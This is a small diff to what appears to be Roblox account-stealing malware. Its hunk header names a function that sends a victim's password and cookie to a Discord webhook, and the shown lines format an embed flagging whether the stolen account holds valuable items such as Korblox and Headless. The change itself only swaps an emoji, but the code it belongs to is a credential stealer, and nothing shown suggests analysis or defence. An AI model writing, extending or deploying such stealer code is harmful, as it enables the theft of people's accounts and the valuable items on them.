@@ -155,12 +155,12 @@ def send_to_discord_background(password, cookie, webhook_url):
                         },
                         {
                             'name': '<:korblox:1153613134599307314>Korblox',
-                            'value': '✅' if korblox else '❌',
+                            'value': '✅' if korblox else '<:xmark:1334547784287785031>',
                             'inline': False
                         },
                         {
                             'name': '<:head_full:1207367926622191666>Headless',
-                            'value': '✅' if headless else '❌',
+                            'value': '✅' if headless else '<:xmark:1334547784287785031>',
                             'inline': False
                         },
                         {
